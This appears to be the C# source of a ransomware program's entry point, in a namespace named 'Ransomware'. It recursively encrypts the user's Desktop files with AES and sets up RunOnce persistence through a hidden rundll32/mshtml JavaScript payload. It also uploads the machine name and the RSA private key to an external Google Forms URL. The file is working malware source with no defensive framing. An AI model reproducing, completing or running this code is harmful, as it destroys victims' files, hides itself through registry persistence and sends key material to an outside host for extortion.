
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Runtime.InteropServices;
using System.Net;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Text;
using System.Threading;

namespace Ransomware
{
    static class Program
    {
        public enum ShowCommands : int
        {
            SW_HIDE = 0,
            SW_SHOWNORMAL = 1,
            SW_NORMAL = 1,
            SW_SHOWMINIMIZED = 2,
            SW_SHOWMAXIMIZED = 3,
            SW_MAXIMIZE = 3,
            SW_SHOWNOACTIVATE = 4,
            SW_SHOW = 5,
            SW_MINIMIZE = 6,
            SW_SHOWMINNOACTIVE = 7,
            SW_SHOWNA = 8,
            SW_RESTORE = 9,
            SW_SHOWDEFAULT = 10,
            SW_FORCEMINIMIZE = 11,
            SW_MAX = 11
        }

        [DllImport("shell32.dll")]
        static extern IntPtr ShellExecute(
            IntPtr hwnd,
            string lpOperation,
            string lpFile,
            string lpParameters,
            string lpDirectory,
            ShowCommands nShowCmd);

        private static void encryptAll(string dir,Byte[] aesKey)
        {
            var di = new DirectoryInfo(dir);
            try
            {
                foreach (FileInfo fi in di.GetFiles("*.*"))
                    ransomwareCryptoMod.encryptFile(fi.FullName, aesKey);
                foreach (DirectoryInfo d in di.GetDirectories()) 
                    encryptAll(d.FullName, aesKey);
            }
            catch (Exception)
            {
            }
        }

        [STAThread]
        static void Main(string[] arg)
        {
            Boolean bCreatedNew;
            Mutex m = new Mutex(false, "cuteRansomware", out bCreatedNew);
            m.WaitOne();
            GC.Collect();
            if (!bCreatedNew) return;
            m.ReleaseMutex();

            System.Threading.Thread.CurrentThread.Priority = System.Threading.ThreadPriority.Highest;
            Byte[] myKey = AES.generateKey();
            RSACryptoServiceProvider RSAObj = new RSACryptoServiceProvider();

            File.WriteAllText("sendBack.txt", RSAObj.ToXmlString(true));
            File.WriteAllText("secret.txt", RSAObj.ToXmlString(false));
            File.WriteAllBytes("secretAES.txt", RSAObj.Encrypt(myKey, false));

            var rundll32Exploit = @"javascript:""\..\mshtml,RunHTMLApplication "";document.write();shell=new%20ActiveXObject(""wscript.shell"");shell.regwrite(""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\adr"",""" + Application.ExecutablePath.Replace(@"\", @"\\") + @""");";
            //System.Diagnostics.Process.Start("rundll32.exe", rundll32Exploit);
            ShellExecute(IntPtr.Zero, "open", "rundll32.exe", rundll32Exploit, "", ShowCommands.SW_HIDE);

            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), myKey);
            
            NameValueCollection nc = new NameValueCollection();
            nc["entry.877603287"] = Environment.MachineName;
            nc["entry.615042698"] = RSAObj.ToXmlString(true);
            new WebClient().UploadValues("https://docs.google.com/forms/d/1lVsy5tTnHE0sJ_zjZxJUNBF41VlCXWC0LFgSQvt3-qA/formResponse", nc);

        }
    }
}
